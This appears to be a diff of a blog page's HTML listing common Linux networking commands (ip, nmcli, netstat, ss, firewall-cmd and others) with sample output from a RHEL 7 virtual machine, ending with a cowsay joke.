-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>date -d "50 days"
-</span><span class='line'>Wed Nov  8 11:42:08 EET 2017
-</span><span class='line'>date -d "50 days ago"
-</span><span class='line'>Mon Jul 31 12:43:24 EEST 2017</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>ifconfig</h4>
-
-<blockquote><p>configure a network interface</p></blockquote>
-
-<ul>
-<li><p>ifconfig <interface> up / down &ndash; activate / deactivate interface</p></li>
-<li><p>ifconfig <interface> promisc &ndash; enable / disable promiscuous mode</p></li>
-<li>ifconfig <interface> netmask addr &ndash; set network mask</li>
-<li>ifconfig <interface> address &ndash; assign IP to interface</li>
-</ul>
-
-
-<h4>ip</h4>
-
-<blockquote><p>show / manipulate routing, devices, policy routing and tunnels</p></blockquote>
-
-<ul>
-<li>show information about all interfaces</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ip a
-</span><span class='line'>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1
-</span><span class='line'>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-</span><span class='line'>    inet 127.0.0.1/8 scope host lo
-</span><span class='line'>       valid_lft forever preferred_lft forever
-</span><span class='line'>    inet6 ::1/128 scope host
-</span><span class='line'>       valid_lft forever preferred_lft forever
-</span><span class='line'>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000
-</span><span class='line'>    link/ether 00:0c:29:47:d7:a8 brd ff:ff:ff:ff:ff:ff
-</span><span class='line'>    inet 192.168.241.130/24 brd 192.168.241.255 scope global dynamic enp0s3
-</span><span class='line'>       valid_lft 1665sec preferred_lft 1665sec
-</span><span class='line'>    inet6 fe80::d7e8:7b48:831f:a1de/64 scope link
-</span><span class='line'>       valid_lft forever preferred_lft forever
-</span><span class='line'>3: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN qlen 1000
-</span><span class='line'>    link/ether 52:54:00:e8:ed:ae brd ff:ff:ff:ff:ff:ff
-</span><span class='line'>    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
-</span><span class='line'>       valid_lft forever preferred_lft forever
-</span><span class='line'>4: virbr0-nic: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc pfifo_fast master virbr0 state DOWN qlen 1000
-</span><span class='line'>    link/ether 52:54:00:e8:ed:ae brd ff:ff:ff:ff:ff:ff</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>show routing table</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ip r
-</span><span class='line'>default via 192.168.241.2 dev enp0s3  proto static  metric 100
-</span><span class='line'>192.168.122.0/24 dev virbr0  proto kernel  scope link  src 192.168.122.1
-</span><span class='line'>192.168.241.0/24 dev enp0s3  proto kernel  scope link  src 192.168.241.130  metric 100</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>show network interface statistics</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ip -s link show enp0s3
-</span><span class='line'>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP mode DEFAULT qlen 1000
-</span><span class='line'>    link/ether 00:0c:29:47:d7:a8 brd ff:ff:ff:ff:ff:ff
-</span><span class='line'>    RX: bytes  packets  errors  dropped overrun mcast   
-</span><span class='line'>    26927      137      0       0       0       0       
-</span><span class='line'>    TX: bytes  packets  errors  dropped carrier collsns
-</span><span class='line'>    112697     201      0       0       0       0       </span></code></pre></td></tr></table></div></figure>
-
-
-<h4>hostnamectl</h4>
-
-<blockquote><p>Control the system hostname</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>hostnamectl
-</span><span class='line'>   Static hostname: tron
-</span><span class='line'>         Icon name: computer-vm
-</span><span class='line'>           Chassis: vm
-</span><span class='line'>        Machine ID: bae5d656813c4d17a18bc5ac0a89cfc2
-</span><span class='line'>           Boot ID: b0bbeef032cf4f6b9f4f764f9a043cb5
-</span><span class='line'>    Virtualization: vmware
-</span><span class='line'>  Operating System: Red Hat Enterprise Linux
-</span><span class='line'>       CPE OS Name: cpe:/o:redhat:enterprise_linux:7.3:GA:server
-</span><span class='line'>            Kernel: Linux 3.10.0-514.26.2.el7.x86_64
-</span><span class='line'>      Architecture: x86-64</span></code></pre></td></tr></table></div></figure>
-
-
-<p>To make hostname changes permanent, modify the content of <strong>/etc/hostname</strong>. You can set it with <strong>hostnamectl set-hostname name</strong></p>
-
-<h4>nmcli</h4>
-
-<blockquote><p>command-line tool for controlling NetworkManager</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli -p
-</span><span class='line'>virbr0: connected to virbr0
-</span><span class='line'>  bridge, 52:54:00:E8:ED:AE, sw, mtu 1500
-</span><span class='line'>  inet4 192.168.122.1/24
-</span><span class='line'>
-</span><span class='line'>enp0s3: connected to Wired connection 1
-</span><span class='line'>  "Intel 82545EM Gigabit Ethernet Controller (Copper) (PRO/1000 MT Single Port Adapter)"
-</span><span class='line'>  ethernet (e1000), 00:0C:29:47:D7:A8, hw, mtu 1500
-</span><span class='line'>  ip4 default
-</span><span class='line'>  inet4 192.168.241.130/24
-</span><span class='line'>  inet6 fe80::d7e8:7b48:831f:a1de/64
-</span><span class='line'>
-</span><span class='line'>lo: unmanaged
-</span><span class='line'>  loopback (unknown), 00:00:00:00:00:00, sw, mtu 65536
-</span><span class='line'>
-</span><span class='line'>virbr0-nic: unmanaged
-</span><span class='line'>  tun, 52:54:00:E8:ED:AE, sw, mtu 1500</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>show information about interface</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-<span class='line-number'>77</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli -p connection show enp0s3
-</span><span class='line'>===============================================================================
-</span><span class='line'>                      Connection profile details (enp0s3)
-</span><span class='line'>===============================================================================
-</span><span class='line'>connection.id:                          enp0s3
-</span><span class='line'>connection.uuid:                        b4c32cc7-c5ff-451c-8af2-9b9124050f99
-</span><span class='line'>connection.stable-id:                   --
-</span><span class='line'>connection.interface-name:              enp0s3
-</span><span class='line'>connection.type:                        802-3-ethernet
-</span><span class='line'>connection.autoconnect:                 yes
-</span><span class='line'>connection.autoconnect-priority:        0
-</span><span class='line'>connection.timestamp:                   1499955175
-</span><span class='line'>connection.read-only:                   no
-</span><span class='line'>connection.permissions:                 
-</span><span class='line'>connection.zone:                        --
-</span><span class='line'>connection.master:                      --
-</span><span class='line'>connection.slave-type:                  --
-</span><span class='line'>connection.autoconnect-slaves:          -1 (default)
-</span><span class='line'>connection.secondaries:                 
-</span><span class='line'>connection.gateway-ping-timeout:        0
-</span><span class='line'>connection.metered:                     unknown
-</span><span class='line'>connection.lldp:                        -1 (default)
-</span><span class='line'>-------------------------------------------------------------------------------
-</span><span class='line'>802-3-ethernet.port:                    --
-</span><span class='line'>802-3-ethernet.speed:                   0
-</span><span class='line'>802-3-ethernet.duplex:                  --
-</span><span class='line'>802-3-ethernet.auto-negotiate:          yes
-</span><span class='line'>802-3-ethernet.mac-address:             00:0C:29:47:D7:A8
-</span><span class='line'>802-3-ethernet.cloned-mac-address:      --
-</span><span class='line'>802-3-ethernet.generate-mac-address-mask:--
-</span><span class='line'>802-3-ethernet.mac-address-blacklist:   
-</span><span class='line'>802-3-ethernet.mtu:                     auto
-</span><span class='line'>802-3-ethernet.s390-subchannels:        
-</span><span class='line'>802-3-ethernet.s390-nettype:            --
-</span><span class='line'>802-3-ethernet.s390-options:            
-</span><span class='line'>802-3-ethernet.wake-on-lan:             1 (default)
-</span><span class='line'>802-3-ethernet.wake-on-lan-password:    --
-</span><span class='line'>-------------------------------------------------------------------------------
-</span><span class='line'>ipv4.method:                            auto
-</span><span class='line'>ipv4.dns:                               
-</span><span class='line'>ipv4.dns-search:                        
-</span><span class='line'>ipv4.dns-options:                       (default)
-</span><span class='line'>ipv4.dns-priority:                      0
-</span><span class='line'>ipv4.addresses:                         
-</span><span class='line'>ipv4.gateway:                           --
-</span><span class='line'>ipv4.routes:                            
-</span><span class='line'>ipv4.route-metric:                      -1
-</span><span class='line'>ipv4.ignore-auto-routes:                no
-</span><span class='line'>ipv4.ignore-auto-dns:                   no
-</span><span class='line'>ipv4.dhcp-client-id:                    --
-</span><span class='line'>ipv4.dhcp-timeout:                      0
-</span><span class='line'>ipv4.dhcp-send-hostname:                yes
-</span><span class='line'>ipv4.dhcp-hostname:                     --
-</span><span class='line'>ipv4.dhcp-fqdn:                         --
-</span><span class='line'>ipv4.never-default:                     no
-</span><span class='line'>ipv4.may-fail:                          yes
-</span><span class='line'>ipv4.dad-timeout:                       -1 (default)
-</span><span class='line'>-------------------------------------------------------------------------------
-</span><span class='line'>ipv6.method:                            auto
-</span><span class='line'>ipv6.dns:                               
-</span><span class='line'>ipv6.dns-search:                        
-</span><span class='line'>ipv6.dns-options:                       (default)
-</span><span class='line'>ipv6.dns-priority:                      0
-</span><span class='line'>ipv6.addresses:                         
-</span><span class='line'>ipv6.gateway:                           --
-</span><span class='line'>ipv6.routes:                            
-</span><span class='line'>ipv6.route-metric:                      -1
-</span><span class='line'>ipv6.ignore-auto-routes:                no
-</span><span class='line'>ipv6.ignore-auto-dns:                   no
-</span><span class='line'>ipv6.never-default:                     no
-</span><span class='line'>ipv6.may-fail:                          yes
-</span><span class='line'>ipv6.ip6-privacy:                       0 (disabled)
-</span><span class='line'>ipv6.addr-gen-mode:                     stable-privacy
-</span><span class='line'>ipv6.dhcp-send-hostname:                yes
-</span><span class='line'>ipv6.dhcp-hostname:                     --
-</span><span class='line'>ipv6.token:                             --
-</span><span class='line'>-------------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>route</h4>
-
-<blockquote><p>show / manipulate the IP routing table</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>route -n
-</span><span class='line'>Kernel IP routing table
-</span><span class='line'>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
-</span><span class='line'>0.0.0.0         192.168.241.2   0.0.0.0         UG    100    0        0 enp0s3
-</span><span class='line'>192.168.122.0   0.0.0.0         255.255.255.0   U     0      0        0 virbr0
-</span><span class='line'>192.168.241.0   0.0.0.0         255.255.255.0   U     100    0        0 enp0s3</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>firewall-cmd</h4>
-
-<blockquote><p>firewalld command line client</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-default-zone
-</span><span class='line'>public</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>enumerate predefined zones</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-zones
-</span><span class='line'>work drop internal external trusted home dmz public block</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>tracepath,  tracepath6</h4>
-
-<blockquote><p>traces path to a network host discovering MTU along this path</p></blockquote>
-
-<h4>netstat</h4>
-
-<blockquote><p> Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships</p></blockquote>
-
-<ul>
-<li>show listening TCP ports in numbers</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -lnt
-</span><span class='line'>Active Internet connections (only servers)
-</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State      
-</span><span class='line'>tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     
-</span><span class='line'>tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN     
-</span><span class='line'>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
-</span><span class='line'>tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
-</span><span class='line'>tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
-</span><span class='line'>tcp6       0      0 :::111                  :::*                    LISTEN     
-</span><span class='line'>tcp6       0      0 :::22                   :::*                    LISTEN     
-</span><span class='line'>tcp6       0      0 ::1:631                 :::*                    LISTEN     
-</span><span class='line'>tcp6       0      0 ::1:25                  :::*                    LISTEN  </span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>list interfaces</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -i
-</span><span class='line'>'Kernel Interface table
-</span><span class='line'>Iface      MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
-</span><span class='line'>enp0s3    1500      139      0      0 0           203      0      0      0 BMRU
-</span><span class='line'>lo       65536       68      0      0 0            68      0      0      0 LRU
-</span><span class='line'>virbr0    1500        0      0      0 0             0      0      0      0 BMU</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>statistics</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>netstat -s
-</span><span class='line'>Ip:
-</span><span class='line'>    190 total packets received
-</span><span class='line'>    0 forwarded
-</span><span class='line'>    0 incoming packets discarded
-</span><span class='line'>    180 incoming packets delivered
-</span><span class='line'>    216 requests sent out
-</span><span class='line'>    65 dropped because of missing route
-</span><span class='line'>Icmp:
-</span><span class='line'>    3 ICMP messages received
-</span><span class='line'>    0 input ICMP message failed.
-</span><span class='line'>    ICMP input histogram:
-</span><span class='line'>        timeout in transit: 2
-</span><span class='line'>        echo requests: 1
-</span><span class='line'>    1 ICMP messages sent
-</span><span class='line'>    0 ICMP messages failed
-</span><span class='line'>    ICMP output histogram:
-</span><span class='line'>        echo replies: 1
-</span><span class='line'>IcmpMsg:
-</span><span class='line'>        InType8: 1
-</span><span class='line'>        InType11: 2
-</span><span class='line'>        OutType0: 1
-</span><span class='line'>Tcp:
-</span><span class='line'>    34 active connections openings
-</span><span class='line'>    0 passive connection openings
-</span><span class='line'>    34 failed connection attempts
-</span><span class='line'>    0 connection resets received
-</span><span class='line'>    0 connections established
-</span><span class='line'>    68 segments received
-</span><span class='line'>    68 segments send out
-</span><span class='line'>    0 segments retransmited
-</span><span class='line'>    0 bad segments received.
-</span><span class='line'>    34 resets sent
-</span><span class='line'>Udp:
-</span><span class='line'>    104 packets received
-</span><span class='line'>    0 packets to unknown port received.
-</span><span class='line'>    0 packet receive errors
-</span><span class='line'>    143 packets sent
-</span><span class='line'>    0 receive buffer errors
-</span><span class='line'>    0 send buffer errors
-</span><span class='line'>UdpLite:
-</span><span class='line'>TcpExt:
-</span><span class='line'>    0 packet headers predicted
-</span><span class='line'>IpExt:
-</span><span class='line'>    InNoRoutes: 3
-</span><span class='line'>    InMcastPkts: 18
-</span><span class='line'>    OutMcastPkts: 26
-</span><span class='line'>    InBcastPkts: 12
-</span><span class='line'>    InOctets: 31730
-</span><span class='line'>    OutOctets: 105262
-</span><span class='line'>    InMcastOctets: 4252
-</span><span class='line'>    OutMcastOctets: 5054
-</span><span class='line'>    InBcastOctets: 4212
-</span><span class='line'>    InNoECTPkts: 190</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>ss</h4>
-
-<blockquote><p>another utility to investigate sockets</p></blockquote>
-
-<ul>
-<li>show statistics</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ss -s
-</span><span class='line'>Total: 1114 (kernel 1133)
-</span><span class='line'>TCP:   0 (estab 0, closed 0, orphaned 0, synrecv 0, timewait 0/0), ports 0
-</span><span class='line'>
-</span><span class='line'>Transport Total     IP        IPv6
-</span><span class='line'>*   1133      -         -        
-</span><span class='line'>RAW     1         0         1        
-</span><span class='line'>UDP     1         1         0        
-</span><span class='line'>TCP     0         0         0        
-</span><span class='line'>INET    2         1         1        
-</span><span class='line'>FRAG    0         0         0        </span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>show all TCP sockets</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ss -t -a
-</span><span class='line'>State      Recv-Q Send-Q Local Address:Port                 Peer Address:Port                
-</span><span class='line'>ESTAB      0      0      192.168.217.132:40382                87.243.6.137:http</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
-</span><span class='line'>/ Q: Why did the programmer call his    \
-</span><span class='line'>| mother long distance? A: Because that |
-</span><span class='line'>\ was her name.                         /
-</span><span class='line'> ---------------------------------------
 </span><span class='line'>        \   ^__^
 </span><span class='line'>         \  (oo)\_______
 </span><span class='line'>            (__)\       )\/\
